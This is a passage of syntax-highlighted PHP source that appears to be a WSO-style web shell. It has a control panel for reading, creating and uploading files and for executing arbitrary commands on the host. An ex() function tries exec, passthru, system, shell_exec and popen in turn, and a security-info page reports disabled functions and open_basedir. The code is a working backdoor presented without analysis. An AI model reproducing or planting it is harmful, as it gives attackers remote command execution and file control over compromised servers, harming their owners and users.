<span class="lineno"> 265</span>          <span class="s1">&#39;&lt;td width=1 align=right&gt;&lt;nobr&gt;&lt;select onchange=&quot;g(null,null,null,null,null,this.value)&quot;&gt;&lt;optgroup label=&quot;Page charset&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$opt_charsets</span><span class="o">.</span><span class="s1">&#39;&lt;/optgroup&gt;&lt;/select&gt;&lt;br&gt;&lt;span&gt;Server IP:&lt;/span&gt;&lt;br&gt;&#39;</span><span class="o">.</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&lt;span&gt;Client IP:&lt;/span&gt;&lt;br&gt;&#39;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/nobr&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#39;</span><span class="o">.</span> 
<span class="lineno"> 266</span>          <span class="s1">&#39;&lt;table cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;&#39;</span><span class="o">.</span><span class="nv">$menu</span><span class="o">.</span><span class="s1">&#39;&lt;/tr&gt;&lt;/table&gt;&lt;div style=&quot;margin:5&quot;&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 267</span> <span class="p">}</span> 
<span class="lineno"> 268</span> 
<span class="lineno"> 269</span> <span class="k">function</span> <span class="nf">printFooter</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 270</span>     <span class="nv">$is_writable</span> <span class="o">=</span> <span class="nb">is_writable</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">?</span><span class="s2">&quot;&lt;font color=green&gt;[ Writeable ]&lt;/font&gt;&quot;</span><span class="o">:</span><span class="s2">&quot;&lt;font color=red&gt;[ Not writable ]&lt;/font&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 271</span> <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 272</span> <span class="x">&lt;/div&gt; </span>
<span class="lineno"> 273</span> <span class="x">&lt;table class=info id=toolsTbl cellpadding=0 cellspacing=0 width=100%&quot;&gt; </span>
<span class="lineno"> 274</span> <span class="x">    &lt;tr&gt; </span>
<span class="lineno"> 275</span> <span class="x">        &lt;td&gt;&lt;form onsubmit=&quot;g(null,this.c.value);return false;&quot;&gt;&lt;span&gt;Change dir:&lt;/span&gt;&lt;br&gt;&lt;input class=&quot;toolsInp&quot; type=text name=c value=&quot;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;/td&gt; </span>
<span class="lineno"> 276</span> <span class="x">        &lt;td&gt;&lt;form onsubmit=&quot;g(&#39;FilesTools&#39;,null,this.f.value);return false;&quot;&gt;&lt;span&gt;Read file:&lt;/span&gt;&lt;br&gt;&lt;input class=&quot;toolsInp&quot; type=text name=f&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;/td&gt; </span>
<span class="lineno"> 277</span> <span class="x">    &lt;/tr&gt; </span>
<span class="lineno"> 278</span> <span class="x">    &lt;tr&gt; </span>
<span class="lineno"> 279</span> <span class="x">        &lt;td&gt;&lt;form onsubmit=&quot;g(&#39;FilesMan&#39;,null,&#39;mkdir&#39;,this.d.value);return false;&quot;&gt;&lt;span&gt;Make dir:&lt;/span&gt;&lt;br&gt;&lt;input class=&quot;toolsInp&quot; type=text name=d&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$is_writable</span><span class="cp">?&gt;</span><span class="x">&lt;/td&gt; </span>
<span class="lineno"> 280</span> <span class="x">        &lt;td&gt;&lt;form onsubmit=&quot;g(&#39;FilesTools&#39;,null,this.f.value,&#39;mkfile&#39;);return false;&quot;&gt;&lt;span&gt;Make file:&lt;/span&gt;&lt;br&gt;&lt;input class=&quot;toolsInp&quot; type=text name=f&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$is_writable</span><span class="cp">?&gt;</span><span class="x">&lt;/td&gt; </span>
<span class="lineno"> 281</span> <span class="x">    &lt;/tr&gt; </span>
<span class="lineno"> 282</span> <span class="x">    &lt;tr&gt; </span>
<span class="lineno"> 283</span> <span class="x">        &lt;td&gt;&lt;form onsubmit=&quot;g(&#39;Console&#39;,null,this.c.value);return false;&quot;&gt;&lt;span&gt;Execute:&lt;/span&gt;&lt;br&gt;&lt;input class=&quot;toolsInp&quot; type=text name=c value=&quot;&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;/td&gt; </span>
<span class="lineno"> 284</span> <span class="x">        &lt;td&gt;&lt;form method=&#39;post&#39; ENCTYPE=&#39;multipart/form-data&#39;&gt; </span>
<span class="lineno"> 285</span> <span class="x">        &lt;input type=hidden name=a value=&#39;FilesMAn&#39;&gt; </span>
<span class="lineno"> 286</span> <span class="x">        &lt;input type=hidden name=c value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 287</span> <span class="x">        &lt;input type=hidden name=p1 value=&#39;uploadFile&#39;&gt; </span>
<span class="lineno"> 288</span> <span class="x">        &lt;input type=hidden name=charset value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 289</span> <span class="x">        &lt;span&gt;Upload file:&lt;/span&gt;&lt;br&gt;&lt;input class=&quot;toolsInp&quot; type=file name=f&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$is_writable</span><span class="cp">?&gt;</span><span class="x">&lt;/td&gt; </span>
<span class="lineno"> 290</span> <span class="x">    &lt;/tr&gt; </span>
<span class="lineno"> 291</span> 
<span class="lineno"> 292</span> <span class="x">&lt;/table&gt; </span>
<span class="lineno"> 293</span> <span class="x">&lt;/div&gt; </span>
<span class="lineno"> 294</span> <span class="x">&lt;/body&gt;&lt;/html&gt; </span>
<span class="lineno"> 295</span> <span class="cp">&lt;?php</span> 
<span class="lineno"> 296</span> <span class="p">}</span> 
<span class="lineno"> 297</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">],</span> <span class="s1">&#39;posix_getpwuid&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="k">function</span> <span class="nf">posix_getpwuid</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="lineno"> 298</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">],</span> <span class="s1">&#39;posix_getgrgid&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="k">function</span> <span class="nf">posix_getgrgid</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="lineno"> 299</span> <span class="k">function</span> <span class="nf">ex</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 300</span>     <span class="nv">$out</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> 
<span class="lineno"> 301</span>     <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 302</span>         <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span><span class="nv">$out</span><span class="p">);</span> 
<span class="lineno"> 303</span>         <span class="nv">$out</span> <span class="o">=</span> <span class="o">@</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$out</span><span class="p">);</span> 
<span class="lineno"> 304</span>     <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;passthru&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 305</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 306</span>         <span class="o">@</span><span class="nb">passthru</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span> 
<span class="lineno"> 307</span>         <span class="nv">$out</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span> 
<span class="lineno"> 308</span>     <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 309</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 310</span>         <span class="o">@</span><span class="nb">system</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span> 
<span class="lineno"> 311</span>         <span class="nv">$out</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span> 
<span class="lineno"> 312</span>     <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;shell_exec&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 313</span>         <span class="nv">$out</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span> 
<span class="lineno"> 314</span>     <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">popen</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)))</span> <span class="p">{</span> 
<span class="lineno"> 315</span>         <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> 
<span class="lineno"> 316</span>         <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> 
<span class="lineno"> 317</span>             <span class="nv">$out</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="mi">1024</span><span class="p">);</span> 
<span class="lineno"> 318</span>         <span class="nb">pclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> 
<span class="lineno"> 319</span>     <span class="p">}</span> 
<span class="lineno"> 320</span>     <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span> 
<span class="lineno"> 321</span> <span class="p">}</span> 
<span class="lineno"> 322</span> <span class="k">function</span> <span class="nf">viewSize</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 323</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&gt;=</span> <span class="mi">1073741824</span><span class="p">)</span> 
<span class="lineno"> 324</span>         <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1073741824</span> <span class="p">)</span><span class="o">.</span> <span class="s1">&#39; GB&#39;</span><span class="p">;</span> 
<span class="lineno"> 325</span>     <span class="k">elseif</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&gt;=</span> <span class="mi">1048576</span><span class="p">)</span> 
<span class="lineno"> 326</span>         <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1048576</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; MB&#39;</span><span class="p">;</span> 
<span class="lineno"> 327</span>     <span class="k">elseif</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&gt;=</span> <span class="mi">1024</span><span class="p">)</span> 
<span class="lineno"> 328</span>         <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1024</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; KB&#39;</span><span class="p">;</span> 
<span class="lineno"> 329</span>     <span class="k">else</span> 
<span class="lineno"> 330</span>         <span class="k">return</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">&#39; B&#39;</span><span class="p">;</span> 
<span class="lineno"> 331</span> <span class="p">}</span> 
<span class="lineno"> 332</span> 
<span class="lineno"> 333</span> <span class="k">function</span> <span class="nf">perms</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 334</span>     <span class="k">if</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xC000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span><span class="p">;</span> 
<span class="lineno"> 335</span>     <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xA000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;l&#39;</span><span class="p">;</span> 
<span class="lineno"> 336</span>     <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span> 
<span class="lineno"> 337</span>     <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x6000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span><span class="p">;</span> 
<span class="lineno"> 338</span>     <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x4000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;d&#39;</span><span class="p">;</span> 
<span class="lineno"> 339</span>     <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x2000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;c&#39;</span><span class="p">;</span> 
<span class="lineno"> 340</span>     <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x1000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;p&#39;</span><span class="p">;</span> 
<span class="lineno"> 341</span>     <span class="k">else</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;u&#39;</span><span class="p">;</span> 
<span class="lineno"> 342</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0100</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span> 
<span class="lineno"> 343</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0080</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span> 
<span class="lineno"> 344</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0040</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span> 
<span class="lineno"> 345</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0020</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span> 
<span class="lineno"> 346</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0010</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span> 
<span class="lineno"> 347</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0008</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span> 
<span class="lineno"> 348</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0004</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span> 
<span class="lineno"> 349</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0002</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span> 
<span class="lineno"> 350</span>     <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0001</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;t&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;T&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span> 
<span class="lineno"> 351</span>     <span class="k">return</span> <span class="nv">$i</span><span class="p">;</span> 
<span class="lineno"> 352</span> <span class="p">}</span> 
<span class="lineno"> 353</span> <span class="k">function</span> <span class="nf">viewPermsColor</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>  
<span class="lineno"> 354</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> 
<span class="lineno"> 355</span>         <span class="k">return</span> <span class="s1">&#39;&lt;font color=#FF0000&gt;&lt;b&gt;&#39;</span><span class="o">.</span><span class="nx">perms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&lt;/b&gt;&lt;/font&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 356</span>     <span class="k">elseif</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> 
<span class="lineno"> 357</span>         <span class="k">return</span> <span class="s1">&#39;&lt;font color=white&gt;&lt;b&gt;&#39;</span><span class="o">.</span><span class="nx">perms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&lt;/b&gt;&lt;/font&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 358</span>     <span class="k">else</span> 
<span class="lineno"> 359</span>         <span class="k">return</span> <span class="s1">&#39;&lt;font color=#00BB00&gt;&lt;b&gt;&#39;</span><span class="o">.</span><span class="nx">perms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&lt;/b&gt;&lt;/font&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 360</span> <span class="p">}</span> 
<span class="lineno"> 361</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;scandir&quot;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 362</span>     <span class="k">function</span> <span class="nf">scandir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 363</span>         <span class="nv">$dh</span>  <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span> 
<span class="lineno"> 364</span>         <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$filename</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">)))</span> <span class="p">{</span> 
<span class="lineno"> 365</span>             <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span> 
<span class="lineno"> 366</span>         <span class="p">}</span> 
<span class="lineno"> 367</span>         <span class="k">return</span> <span class="nv">$files</span><span class="p">;</span> 
<span class="lineno"> 368</span>     <span class="p">}</span> 
<span class="lineno"> 369</span> <span class="p">}</span> 
<span class="lineno"> 370</span> <span class="k">function</span> <span class="nf">which</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 371</span>     <span class="nv">$path</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="s1">&#39;which &#39;</span><span class="o">.</span><span class="nv">$p</span><span class="p">);</span> 
<span class="lineno"> 372</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> 
<span class="lineno"> 373</span>         <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span> 
<span class="lineno"> 374</span>     <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno"> 375</span> <span class="p">}</span> 
<span class="lineno"> 376</span> <span class="k">function</span> <span class="nf">actionSecInfo</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 377</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 378</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Server security information&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 379</span>     <span class="k">function</span> <span class="nf">showSecParam</span><span class="p">(</span><span class="nv">$n</span><span class="p">,</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 380</span>         <span class="nv">$v</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> 
<span class="lineno"> 381</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 382</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;span&gt;&#39;</span><span class="o">.</span><span class="nv">$n</span><span class="o">.</span><span class="s1">&#39;: &lt;/span&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 383</span>             <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> 
<span class="lineno"> 384</span>                 <span class="k">echo</span> <span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 385</span>             <span class="k">else</span> 
<span class="lineno"> 386</span>                 <span class="k">echo</span> <span class="s1">&#39;&lt;pre class=ml1&gt;&#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 387</span>         <span class="p">}</span> 
<span class="lineno"> 388</span>     <span class="p">}</span> 
<span class="lineno"> 389</span>      
<span class="lineno"> 390</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Server software&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">&#39;SERVER_SOFTWARE&#39;</span><span class="p">));</span> 
<span class="lineno"> 391</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Disabled PHP Functions&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;none&#39;</span><span class="p">);</span> 
<span class="lineno"> 392</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Open base dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span> 
<span class="lineno"> 393</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Safe mode exec dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_exec_dir&#39;</span><span class="p">));</span> 
<span class="lineno"> 394</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Safe mode include dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_include_dir&#39;</span><span class="p">));</span> 
<span class="lineno"> 395</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;cURL support&#39;</span><span class="p">,</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;curl_version&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;enabled&#39;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span> 
<span class="lineno"> 396</span>     <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 397</span>     <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_get_client_info&#39;</span><span class="p">))</span> 
<span class="lineno"> 398</span>         <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;MySql (&quot;</span><span class="o">.</span><span class="nb">mysql_get_client_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;)&quot;</span><span class="p">;</span> 
